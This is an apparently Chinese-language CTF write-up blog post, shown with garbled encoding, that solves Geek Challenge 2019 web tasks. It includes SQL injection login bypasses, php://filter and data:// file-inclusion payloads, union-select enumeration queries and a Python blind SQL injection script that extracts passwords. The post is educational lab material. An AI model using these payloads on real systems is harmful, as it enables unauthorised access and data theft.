<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="[æå®¢å¤§æŒ‘æˆ˜2019]Web WP"><meta name="keywords" content="sqlæ³¨å…¥,ä»£ç å®¡è®¡,æ–‡ä»¶åŒ…å«,æ–‡ä»¶ä¸Šä¼ ,åºåˆ—åŒ–"><meta name="author" content="Neorah"><meta name="copyright" content="Neorah"><title>[æå®¢å¤§æŒ‘æˆ˜2019]Web WP | Neorah's Blog</title><link rel="shortcut icon" href="/img/melody-favicon32.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"DBINOT6FYU","apiKey":"c9a16d407275792c2b0577f2e8765356","indexName":"dev_Neorah","hits":{"per_page":10},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EasySQL"><span class="toc-number">1.</span> <span class="toc-text">EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Havefun"><span class="toc-number">2.</span> <span class="toc-text">Havefun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Secret-File"><span class="toc-number">3.</span> <span class="toc-text">Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpä¼ªåè®®"><span class="toc-number">3.0.1.</span> <span class="toc-text">phpä¼ªåè®®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-åè®®"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">file:&#x2F;&#x2F;åè®®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-åè®®"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;åè®®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data"><span class="toc-number">3.0.1.3.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LoveSQL"><span class="toc-number">4.</span> <span class="toc-text">LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BabySQL"><span class="toc-number">5.</span> <span class="toc-text">BabySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HardSQL"><span class="toc-number">6.</span> <span class="toc-text">HardSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FinalSQL"><span class="toc-number">7.</span> <span class="toc-text">FinalSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">8.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct"><span class="toc-number">8.0.1.</span> <span class="toc-text">__destruct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">8.0.2.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#private-å£°æ˜"><span class="toc-number">8.0.3.</span> <span class="toc-text">private å£°æ˜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Upload"><span class="toc-number">9.</span> <span class="toc-text">Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-ME"><span class="toc-number">10.</span> <span class="toc-text">RCE ME</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/neorah.jpg"></div><div class="author-info__name text-center">Neorah</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Neorah" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">31</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">33</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">33</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/top.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Neorah's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Posts</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">[æå®¢å¤§æŒ‘æˆ˜2019]Web WP</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/">sqlæ³¨å…¥</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">å¸ƒå°”ç›²æ³¨</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">æŠ¥é”™æ³¨å…¥</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/">php</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">æ–‡ä»¶ä¸Šä¼ </a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/">å›¾ç‰‡ä¸Šä¼ </a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E5%BA%8F%E5%88%97%E5%8C%96/">åºåˆ—åŒ–</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">3.5k</span><span class="post-meta__separator">|</span><span>Reading time: 14 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>åŸæ¥è¿™å°±æ˜¯ä¸Šæ¬¡å‡†å¤‡åšçš„æˆä¿¡çš„é¢˜ï¼Œå¥½8</p>
<h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>æ¯”è¾ƒç®€å• æ²¡æœ‰åšè¿‡å¤šçš„å°è¯•</p>
<img src="/ctf/jikectf/1.png" class="">

<p>åœ¨ç”¨æˆ·åä¸­è¾“å…¥1â€™,ä¼šæç¤º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°†ç”¨æˆ·åè®¾ä¸º<code>admin&#39; or 1=1 #</code>ï¼Œè¾¾åˆ°ä½¿ç”¨adminæˆåŠŸç™»é™†çš„ç›®çš„ã€‚</p>
<img src="/ctf/jikectf/2.png" class="">



<h1 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h1><p>æ¯”è¾ƒç®€å•ï¼Œçœ‹æºç å°±èƒ½å¤ŸçŸ¥é“ä¼ å…¥<code>?cat=dog</code>ï¼Œå¾—åˆ°flag</p>
<h1 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h1><p>ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p>
<img src="/ctf/jikectf/3.png" class="">

<p>çœ‹æºç ï¼Œè¿›å…¥å¦å¤–ä¸€ä¸ªç•Œé¢ã€‚</p>
<img src="/ctf/jikectf/4.png" class="">

<p>ä½†æ˜¯ç‚¹å‡»SECRETåå°±åˆ°ENDäº†ã€‚</p>
<img src="/ctf/jikectf/5.png" class="">

<p>æ ¹æ®æç¤ºçœ‹çœ‹networkã€‚å‘ç°æœ‰ä¸€ä¸ªaction.phpï¼Œä½†ç‚¹è¿›å»å´ç›´æ¥è·³è½¬åˆ°äº†endã€‚å› æ­¤æŠ“åŒ…åº·åº·ã€‚</p>
<img src="/ctf/jikectf/6.png" class="">

<p>action.phpä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ³¨é‡Šï¼Œè¿›å»åº·åº·ï¼Œæ˜¯è¿™æ ·ä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å«ï¼Œå¹¶ä¸”filteræ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå› æ­¤ç›´æ¥ç”¨filterä¼ªåè®®è¯»å–flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¯»å‡ºæ¥çš„ç»è¿‡base64è§£ç å°±å¾—åˆ°flagäº†ã€‚</p>
<p>è¶è¿™é“é¢˜å¤ä¹ ä¸€ä¸‹phpä¼ªåè®®8.</p>
<h3 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h3><p>phpä¼ªåè®®ï¼Œäº‹å®ä¸Šæ˜¯å…¶æ”¯æŒçš„åè®®ä¸å°è£…åè®®ã€‚phpä¸­æ”¯æŒçš„ä¼ªåè®®ï¼š</p>
<blockquote>
<p>file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br>http:// â€” è®¿é—® HTTP(s) ç½‘å€<br>ftp:// â€” è®¿é—® FTP(s) URLs<br>php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰<br>zlib:// â€” å‹ç¼©æµ<br>data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰<br>glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼<br>phar:// â€” PHP å½’æ¡£<br>ssh2:// â€” Secure Shell 2<br>rar:// â€” RAR<br>ogg:// â€” éŸ³é¢‘æµ<br>expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ</p>
</blockquote>
<h4 id="file-åè®®"><a href="#file-åè®®" class="headerlink" title="file://åè®®"></a>file://åè®®</h4><p>file://ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚</p>
<h4 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php://åè®®"></a>php://åè®®</h4><p><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a></p>
<p>php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputï¼Œphp://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p>
<ul>
<li><strong>php://input:</strong></li>
</ul>
<p>php://inputä»£è¡¨å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®ï¼Œç®€å•æ¥è¯´POSTè¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œphp://inputå¯ä»¥è·å–åˆ°postçš„æ•°æ®ã€‚</p>
<p>ä½†æ¯”è¾ƒç‰¹æ®Šçš„ä¸€ç‚¹æ˜¯ï¼Œenctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚</p>
<p>ä¾‹é¢˜ï¼š</p>
<p>åˆ†æå¦‚ä¸‹ä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç çš„æ„æ€å¦‚ä¸‹ï¼š</p>
<ol>
<li><p>é€šè¿‡GETä¼ é€’ä¸‰ä¸ªå‚æ•°txt,file,password.</p>
</li>
<li><p><code>$user</code>å­˜åœ¨</p>
</li>
<li><p>è¯»å–<code>$user</code>çš„æ–‡ä»¶å†…å®¹ä¸ºwelcome to the bugkuctf</p>
</li>
<li><p>fileçš„includeå†…å®¹ä¸ºhint.php</p>
</li>
</ol>
<p>å› æ­¤txtå‚æ•°ç”¨postä¼ é€’æ•°æ®welcome to the bugkuctfåï¼Œå¯ä»¥ç”¨php://inputè·å–åˆ°ã€‚</p>
<p>fileç›´æ¥å¯ä»¥ç”¨php://filterè¯»hint.phpï¼ˆç”±äº<code>include($file)</code></p>
<p>å› æ­¤æœ€ç»ˆpayloadä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨postä¼ é€’welcome to the bugkuctfï¼Œå¾—åˆ°æºç ã€‚</p>
<ul>
<li><strong>php://output</strong></li>
</ul>
<p>php://output æ˜¯ä¸€ä¸ªåªå†™çš„æ•°æ®æµï¼Œ å…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</p>
<ul>
<li><strong>php://filter</strong></li>
</ul>
<p>è¿™ä¸ªä¼ªåè®®ç”¨å¾—å¾ˆå¤šï¼Œåœ¨æ–‡ä»¶è¯»å–æˆ–è€…getshellæ—¶éƒ½æœ‰å¯èƒ½ä½¿ç”¨ï¼Œç”¨äºè¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº†ã€‚</p>
<blockquote>
<p>php://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">ç­›é€‰è¿‡æ»¤</a>åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ <a href="https://www.php.net/manual/zh/function.readfile.php" target="_blank" rel="noopener">readfile()</a>ã€ <a href="https://www.php.net/manual/zh/function.file.php" target="_blank" rel="noopener">file()</a> å’Œ <a href="https://www.php.net/manual/zh/function.file-get-contents.php" target="_blank" rel="noopener">file_get_contents()</a>ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p>
<p>php://filter ç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚ å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚</p>
</blockquote>
<p>å®˜æ–¹æ–‡æ¡£ä¸­çš„php://filterå‚æ•°ï¼š</p>
<table>
<thead>
<tr>
<th align="left">åç§°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td>
<td align="left">è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td>
</tr>
<tr>
<td align="left">read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ<em>|</em>ï¼‰åˆ†éš”ã€‚</td>
</tr>
<tr>
<td align="left">write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ<em>|</em>ï¼‰åˆ†éš”ã€‚</td>
</tr>
<tr>
<td align="left">&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td align="left">ä»»ä½•æ²¡æœ‰ä»¥ <em>read=</em> æˆ– <em>write=</em> ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td>
</tr>
</tbody></table>
<p>ä¸¾ä¸ªä¾‹ï¼Œå°±ä»¥è¿™é“é¢˜ä¸­çš„payloadä¸ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„convert.base54-encodeå°±æ˜¯è¿‡æ»¤å™¨åç§°ï¼Œå°†è¾“å…¥æµè¿›è¡Œbase64ç¼–ç ã€‚</p>
<p>resource=flag.phpï¼Œä»£è¡¨è¯»å–flag.phpçš„å†…å®¹ã€‚</p>
<p><a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">å¯ç”¨è¿‡æ»¤å™¨æ–‡æ¡£</a></p>
<img src="/ctf/jikectf/7.png" class="">



<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><blockquote>
<p>data:èµ„æºç±»å‹;ç¼–ç ,å†…å®¹<br>æ•°æ®æµå°è£…å™¨<br>å½“allow_url_include æ‰“å¼€çš„æ—¶å€™ï¼Œä»»æ„æ–‡ä»¶åŒ…å«å°±ä¼šæˆä¸ºä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$filename=$_GET[<span class="string">"a"</span>];  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$filename"</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¯»åˆ°phpinfo()ã€‚</p>
<h1 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h1><p>æœ¬æ¥å‡†å¤‡è€è€å®å®çš„æ³¨å…¥ä¸€ä¸‹çš„ï¼Œç„¶è€Œæˆ‘å…ˆç”¨ä¸‡èƒ½å¯†ç <code>admin&#39; or 1=1 #</code>è¯•äº†ä¸€ä¸‹ï¼Œç™»ä¸Šå»äº†ã€‚</p>
<img src="/ctf/jikectf/8.png" class="">

<p>åº•ä¸‹é‚£ä¸²å­—ç¬¦æˆ‘ç”¨md5è§£ç äº†ä¸‹æ²¡æœ‰è§£å‡ºæ¥ã€‚</p>
<p>æ—¢ç„¶èƒ½ç”¨è¿™ä¸ªä¸‡èƒ½å¯†ç ç™»è¿›å»ï¼Œé‚£æˆ‘å°±ç¥­å‡ºæˆ‘çš„ç¥–ä¼ è„šæœ¬ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ac97e097-4209-4023-8bad-215848f005eb.node3.buuoj.cn/check.php?username='</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"admin' and (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)%23&amp;password=1"</span></span><br><span class="line">payload2 = <span class="string">"admin' and (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where("</span> \</span><br><span class="line">           <span class="string">"table_schema='geek')),&#123;&#125;,1))&gt;&#123;&#125;)%23&amp;password=1"</span></span><br><span class="line">payload3 = <span class="string">"admin' and (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where("</span> \</span><br><span class="line">           <span class="string">"table_name='l0ve1ysq1')),&#123;&#125;,1))&gt;&#123;&#125;)%23&amp;password=1"</span></span><br><span class="line">payload4 = <span class="string">"admin' and (ascii(substr((select(group_concat(password))from l0ve1ysq1),&#123;&#125;,1))&gt;&#123;&#125;)%23&amp;password=1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = payload4.format(i, mid)</span><br><span class="line"></span><br><span class="line">        new_url = url + payload</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Login Success!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>å°±è·‘å‡ºæ¥äº†ã€‚</p>
<p>å…¶å®è¿™é“é¢˜æœ‰å›æ˜¾çš„ï¼Œå¯ä»¥ç›´æ¥ç”¨è”åˆæŸ¥æ‰¾ã€‚ä½†æˆ‘æœ¬æ¥æ˜¯æƒ³ç”¨ä¸€ä¸‹order byçš„æ³¨å…¥ï¼Œå› ä¸ºæˆ‘çœ‹äº†ç¯‡<a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">æ–‡ç« </a>ã€‚ç¡®å®èƒ½ç”¨order byåšï¼Œä½†æˆ‘è§‰å¾—åŸç†å’Œandæ˜¯ä¸€æ ·çš„ã€‚å¯èƒ½andä»€ä¹ˆçš„è¢«ç¦äº†å°±å¯ä»¥è¿™æ ·åš8ã€‚</p>
<p>æ¥ä¸‹æ¥è¿˜æ˜¯ç”¨è”åˆæŸ¥æ‰¾åšä¸€ä¸‹8ã€‚</p>
<p>å…ˆç”¨order byç¡®å®šåˆ—æ•°ã€‚</p>
<img src="/ctf/jikectf/9.png" class="">

<p>åˆ°4æŠ¥é”™äº†ï¼Œé‚£å°±æ˜¯3åˆ—ã€‚</p>
<p>å†çœ‹çœ‹å›æ˜¾ä½ï¼š</p>
<img src="/ctf/jikectf/10.png" class="">

<p>å›æ˜¾ä½2ï¼Œ3ã€‚å…ˆçˆ†åº“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,database()%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/11.png" class="">

<p>çˆ†è¡¨åã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,(select(group_concat(table_name))from(information_schema.tables)where table_schema&#x3D;&#39;geek&#39;)%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<img src="/ctf/jikectf/12.png" class="">

<p>çœ‹çœ‹geekuserä¸­çš„åˆ—å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,(select(group_concat(column_name))from(information_schema.columns)where table_name&#x3D;&#39;geekuser&#39;)%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p>æœ‰passwordï¼Œå†è¿›å»çœ‹çœ‹å†…å®¹ã€‚</p>
